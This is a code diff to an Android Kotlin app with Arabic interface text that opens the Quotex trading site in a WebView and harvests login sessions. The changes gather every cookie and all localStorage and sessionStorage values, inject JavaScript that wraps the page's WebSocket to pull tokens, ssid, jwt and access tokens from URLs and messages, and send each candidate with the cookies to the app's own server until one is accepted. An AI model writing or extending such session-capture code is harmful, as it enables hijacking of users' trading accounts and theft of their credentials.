@@ -11,7 +11,6 @@ import android.view.Gravity
 import android.view.ViewGroup
 import android.webkit.CookieManager
 import android.webkit.JavascriptInterface
-import android.webkit.WebResourceRequest
 import android.webkit.WebView
 import android.webkit.WebViewClient
 import android.widget.Button
@@ -43,8 +42,9 @@ class MainActivity : AppCompatActivity() {
 
     private var currentTab = "settings"
     private var linkingMode = false
-    private var lastSentSsid: String? = null
-    private var sentCount = 0
+    private val triedCandidates = mutableSetOf<String>()
+    private var candidateList = mutableListOf<String>()
+    private var currentIndex = 0
 
     private val client = OkHttpClient.Builder()
         .connectTimeout(30, TimeUnit.SECONDS)
@@ -150,20 +150,20 @@ class MainActivity : AppCompatActivity() {
                 handler?.proceed()
             }
 
-            override fun onPageStarted(view: WebView?, url: String?, favicon: android.graphics.Bitmap?) {
-                super.onPageStarted(view, url, favicon)
-                if (url?.contains("quotex.com") == true) injectInterceptor()
-            }
-
             override fun onPageFinished(view: WebView, url: String) {
                 super.onPageFinished(view, url)
                 if (url.contains("quotex.com")) {
                     injectInterceptor()
-                    if (url.contains("/trade") || url.contains("/cabinet") || url.contains("/dashboard")) {
-                        statusBar.text = "✅ تم اكتشاف تسجيل الدخول — جاري التقاط الجلسة..."
-                        tryCaptureAll()
-                        Handler(Looper.getMainLooper()).postDelayed({ tryCaptureAll() }, 2000)
-                        Handler(Looper.getMainLooper()).postDelayed({ tryCaptureAll() }, 5000)
+                    if (url.contains("/trade") || url.contains("/cabinet") || url.contains("/dashboard") ||
+                        url.contains("/ar/trade") || url.contains("/en/trade")) {
+                        if (linkingMode) {
+                            statusBar.text = "✅ تم اكتشاف تسجيل الدخول — جاري التقاط الجلسة..."
+                            // محاولات متعددة بفواصل زمنية
+                            Handler(Looper.getMainLooper()).postDelayed({ collectAndTry() }, 2000)
+                            Handler(Looper.getMainLooper()).postDelayed({ collectAndTry() }, 4000)
+                            Handler(Looper.getMainLooper()).postDelayed({ collectAndTry() }, 7000)
+                            Handler(Looper.getMainLooper()).postDelayed({ collectAndTry() }, 11000)
+                        }
                     }
                 }
             }
@@ -180,6 +180,10 @@ class MainActivity : AppCompatActivity() {
 
     private fun showMarket() {
         currentTab = "market"
+        linkingMode = true
+        triedCandidates.clear()
+        currentIndex = 0
+        candidateList.clear()
         statusBar.text = "📈 السوق — سجّل دخولك إلى Quotex"
         updateTabButtons()
         webView.loadUrl("$QX_DOMAIN/ar/trade")
@@ -199,154 +203,101 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun tryCaptureAll() {
-        tryCaptureFromCookies()
-        tryCaptureFromStorage()
-    }
+    /**
+     * يجمع كل المرشحين (من الكوكيز + localStorage) ويبدأ محاولة الإرسال.
+     */
+    private fun collectAndTry() {
+        if (!linkingMode) return
+        if (currentIndex < candidateList.size) return
 
-    private fun tryCaptureFromCookies() {
-        val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN) ?: return
-        for (name in listOf("ssid", "session", "token", "authorization", "auth")) {
-            val v = cookies.split(";").map { it.trim() }
-                .firstOrNull { it.startsWith("$name=") }?.substringAfter("=")
-            if (v != null && v.length > 20) {
-                sendSsid(v)
-                return
-            }
+        // 1) كل الكوكيز
+        val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN) ?: ""
+        for (pair in cookies.split(";")) {
+            val trimmed = pair.trim()
+            val eqIdx = trimmed.indexOf("=")
+            if (eqIdx <= 0) continue
+            val value = trimmed.substring(eqIdx + 1).trim()
+            addCandidate(value)
         }
-    }
 
-    private fun tryCaptureFromStorage() {
+        // 2) كل localStorage + sessionStorage
         val js = """
             (function() {
                 try {
-                    var keys = ['session','token','ssid','auth','authorization','user','account'];
-                    var found = null;
-                    function scan(storage) {
-                        for (var i = 0; i < keys.length; i++) {
-                            var v = storage.getItem(keys[i]);
-                            if (!v) continue;
-                            if (v.length > 20 && v.length < 5000 && !found) found = v;
-                            try {
-                                var o = JSON.parse(v);
-                                if (o) {
-                                    ['token','session','ssid','authorization','access_token'].forEach(function(k){
-                                        if (o[k] && typeof o[k] === 'string' && o[k].length > 20 && !found) found = o[k];
-                                    });
-                                }
-                            } catch(e){}
-                        }
+                    var result = [];
+                    for (var i = 0; i < localStorage.length; i++) {
+                        var k = localStorage.key(i);
+                        var v = localStorage.getItem(k);
+                        result.push(k + '|||' + v);
                     }
-                    scan(localStorage);
-                    scan(sessionStorage);
-                    if (found && window.OscarBridge) window.OscarBridge.onSsid(found);
-                } catch(e){}
+                    for (var i = 0; i < sessionStorage.length; i++) {
+                        var k = sessionStorage.key(i);
+                        var v = sessionStorage.getItem(k);
+                        result.push(k + '|||' + v);
+                    }
+                    return result.join('\\n@@@\\n');
+                } catch(e){ return ''; }
             })();
         """.trimIndent()
-        webView.evaluateJavascript(js, null)
+
+        webView.evaluateJavascript(js) { result ->
+            try {
+                val raw = result.trim('"').replace("\\n", "\n").replace("\\\"", "\"")
+                for (line in raw.split("@@@")) {
+                    val idx = line.indexOf("|||")
+                    if (idx <= 0) continue
+                    val v = line.substring(idx + 3)
+                    addCandidate(v)
+                }
+            } catch (e: Exception) {}
+            processNextCandidate()
+        }
+
+        // إذا لم يكن هناك localStorage، جرب المجموعة الأولى فوراً
+        Handler(Looper.getMainLooper()).postDelayed({ processNextCandidate() }, 500)
     }
 
-    private fun injectInterceptor() {
-        val js = """
-            (function() {
-                if (window.__oscarHooked2) return;
-                window.__oscarHooked2 = true;
-
-                function push(v) {
-                    if (v && typeof v === 'string' && v.length > 20 && v.length < 5000) {
-                        if (window.OscarBridge) window.OscarBridge.onSsid(v);
+    private fun addCandidate(rawValue: String) {
+        if (rawValue.length < 20) return
+        // إذا كانت JSON، استخرج القيم المحتملة
+        if (rawValue.trim().startsWith("{")) {
+            try {
+                val obj = JSONObject(rawValue)
+                val keys = obj.keys()
+                while (keys.hasNext()) {
+                    val k = keys.next()
+                    val v = obj.optString(k, "")
+                    if (v.length in 30..500 && v !in candidateList) {
+                        candidateList.add(v)
                     }
                 }
-
-                var OrigWS = window.WebSocket;
-                var hookedWS = function(url, protocols) {
-                    try {
-                        if (url) {
-                            var patterns = [
-                                /[?&]token=([^&]+)/,
-                                /[?&]session=([^&]+)/,
-                                /[?&]ssid=([^&]+)/,
-                                /[?&]auth=([^&]+)/
-                            ];
-                            for (var i = 0; i < patterns.length; i++) {
-                                var m = url.match(patterns[i]);
-                                if (m && m[1]) push(decodeURIComponent(m[1]));
-                            }
-                        }
-                    } catch(e){}
-                    var ws = protocols ? new OrigWS(url, protocols) : new OrigWS(url);
-                    try {
-                        ws.addEventListener('message', function(ev) {
-                            try {
-                                var d = ev.data;
-                                if (typeof d !== 'string') return;
-                                var pats = [
-                                    /"session"\s*:\s*"([^"]+)"/,
-                                    /"token"\s*:\s*"([^"]+)"/,
-                                    /"ssid"\s*:\s*"([^"]+)"/,
-                                    /"authorization"\s*:\s*"([^"]+)"/,
-                                    /"access_token"\s*:\s*"([^"]+)"/,
-                                    /"jwt"\s*:\s*"([^"]+)"/
-                                ];
-                                for (var i = 0; i < pats.length; i++) {
-                                    var m = d.match(pats[i]);
-                                    if (m && m[1]) { push(m[1]); break; }
-                                }
-                            } catch(e){}
-                        });
-                        ws.addEventListener('open', function() {
-                            tryCapture();
-                        });
-                    } catch(e){}
-                    return ws;
-                };
-                hookedWS.prototype = OrigWS.prototype;
-                hookedWS.CONNECTING = OrigWS.CONNECTING;
-                hookedWS.OPEN = OrigWS.OPEN;
-                hookedWS.CLOSING = OrigWS.CLOSING;
-                hookedWS.CLOSED = OrigWS.CLOSED;
-                window.WebSocket = hookedWS;
-            })();
-        """.trimIndent()
-        webView.evaluateJavascript(js, null)
-    }
-
-    inner class Bridge {
-        @JavascriptInterface
-        fun onSsid(ssid: String) {
-            if (ssid.length < 20) return
-            sendSsid(ssid)
+                return
+            } catch (e: Exception) {}
         }
-
-        @JavascriptInterface
-        fun tryCapture() {
-            runOnUiThread { tryCaptureAll() }
-        }
-
-        @JavascriptInterface
-        fun openMarket() {
-            runOnUiThread { showMarket() }
-        }
-
-        @JavascriptInterface
-        fun openSettings() {
-            runOnUiThread { showSettings() }
-        }
-
-        @JavascriptInterface
-        fun logout() {
-            prefs.edit().remove("license_key").apply()
-            runOnUiThread { recreate() }
+        // قيمة عادية
+        if (rawValue.length in 30..500 && rawValue !in candidateList) {
+            candidateList.add(rawValue)
         }
     }
 
-    private fun sendSsid(ssid: String) {
-        if (ssid == lastSentSsid && sentCount > 0) return
-        if (sentCount > 5) return
+    private fun processNextCandidate() {
+        if (!linkingMode) return
+        if (currentIndex >= candidateList.size) {
+            statusBar.text = "❌ لم نعثر على الجلسة تلقائياً. اضغط الإعدادات ثم عُد للسوق وحاول مجدداً."
+            return
+        }
+        val ssid = candidateList[currentIndex]
+        currentIndex++
+        sendCandidate(ssid)
+    }
 
-        lastSentSsid = ssid
-        sentCount++
-        statusBar.text = "🔗 جاري إرسال الجلسة للسيرفر (محاولة $sentCount)..."
+    private fun sendCandidate(ssid: String) {
+        if (ssid in triedCandidates) {
+            processNextCandidate()
+            return
+        }
+        triedCandidates.add(ssid)
+        statusBar.text = "🔗 محاولة $currentIndex من ${candidateList.size}..."
 
         val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN) ?: ""
 
@@ -367,25 +318,104 @@ class MainActivity : AppCompatActivity() {
 
                 withContext(Dispatchers.Main) {
                     if (json.optBoolean("ok")) {
-                        statusBar.text = "✅ تم ربط الحساب بنجاح! جاري العودة للإعدادات..."
+                        statusBar.text = "✅ تم ربط الحساب بنجاح!"
                         Toast.makeText(this@MainActivity, "✅ تم ربط الحساب", Toast.LENGTH_LONG).show()
-                        sentCount = 0
+                        triedCandidates.clear()
+                        candidateList.clear()
+                        currentIndex = 0
+                        linkingMode = false
                         Handler(Looper.getMainLooper()).postDelayed({ showSettings() }, 800)
                     } else {
-                        val err = json.optString("error", "خطأ")
-                        statusBar.text = "⚠️ فشلت المحاولة $sentCount: $err"
-                        if (sentCount < 5) {
-                            Handler(Looper.getMainLooper()).postDelayed({ tryCaptureAll() }, 3000)
-                        } else {
-                            statusBar.text = "❌ لم نتمكن من التقاط الجلسة تلقائياً. اضغط على زر الإعدادات ثم حاول مجدداً"
-                        }
+                        // فشل هذا المرشح، جرب التالي
+                        Handler(Looper.getMainLooper()).postDelayed({ processNextCandidate() }, 1000)
                     }
                 }
             } catch (e: Exception) {
                 withContext(Dispatchers.Main) {
-                    statusBar.text = "⚠️ خطأ اتصال: ${e.message}"
+                    Handler(Looper.getMainLooper()).postDelayed({ processNextCandidate() }, 1000)
                 }
             }
+        }
+    }
+
+    private fun injectInterceptor() {
+        val js = """
+            (function() {
+                if (window.__oscarHooked2) return;
+                window.__oscarHooked2 = true;
+                function push(v) {
+                    if (v && typeof v === 'string' && v.length > 20 && v.length < 5000) {
+                        if (window.OscarBridge && window.OscarBridge.onSsid) window.OscarBridge.onSsid(v);
+                    }
+                }
+                var OrigWS = window.WebSocket;
+                var hooked = function(url, protocols) {
+                    try {
+                        if (url) {
+                            var pats = [/[?&]token=([^&]+)/, /[?&]session=([^&]+)/, /[?&]ssid=([^&]+)/, /[?&]auth=([^&]+)/];
+                            for (var i = 0; i < pats.length; i++) {
+                                var m = url.match(pats[i]);
+                                if (m && m[1]) push(decodeURIComponent(m[1]));
+                            }
+                        }
+                    } catch(e){}
+                    var ws = protocols ? new OrigWS(url, protocols) : new OrigWS(url);
+                    try {
+                        ws.addEventListener('message', function(ev) {
+                            try {
+                                var d = ev.data;
+                                if (typeof d !== 'string') return;
+                                var ps = [/"session"\s*:\s*"([^"]+)"/, /"token"\s*:\s*"([^"]+)"/,
+                                          /"ssid"\s*:\s*"([^"]+)"/, /"authorization"\s*:\s*"([^"]+)"/,
+                                          /"access_token"\s*:\s*"([^"]+)"/, /"jwt"\s*:\s*"([^"]+)"/];
+                                for (var i = 0; i < ps.length; i++) {
+                                    var m = d.match(ps[i]);
+                                    if (m && m[1]) { push(m[1]); break; }
+                                }
+                            } catch(e){}
+                        });
+                    } catch(e){}
+                    return ws;
+                };
+                hooked.prototype = OrigWS.prototype;
+                hooked.CONNECTING = OrigWS.CONNECTING;
+                hooked.OPEN = OrigWS.OPEN;
+                hooked.CLOSING = OrigWS.CLOSING;
+                hooked.CLOSED = OrigWS.CLOSED;
+                window.WebSocket = hooked;
+            })();
+        """.trimIndent()
+        webView.evaluateJavascript(js, null)
+    }
+
+    inner class Bridge {
+        @JavascriptInterface
+        fun onSsid(ssid: String) {
+            if (!linkingMode) return
+            if (ssid.length < 20) return
+            // أضف للمرشحين إن لم يكن موجوداً
+            if (ssid !in candidateList) candidateList.add(ssid)
+            // أرسله فوراً
+            Handler(Looper.getMainLooper()).post {
+                if (linkingMode && ssid !in triedCandidates) {
+                    sendCandidate(ssid)
+                }
+            }
+        }
+
+        @JavascriptInterface
+        fun openSettings() { runOnUiThread { showSettings() } }
+
+        @JavascriptInterface
+        fun openMarket() { runOnUiThread { showMarket() } }
+
+        @JavascriptInterface
+        fun retryCapture() { runOnUiThread { collectAndTry() } }
+
+        @JavascriptInterface
+        fun logout() {
+            prefs.edit().remove("license_key").apply()
+            runOnUiThread { recreate() }
         }
     }
 
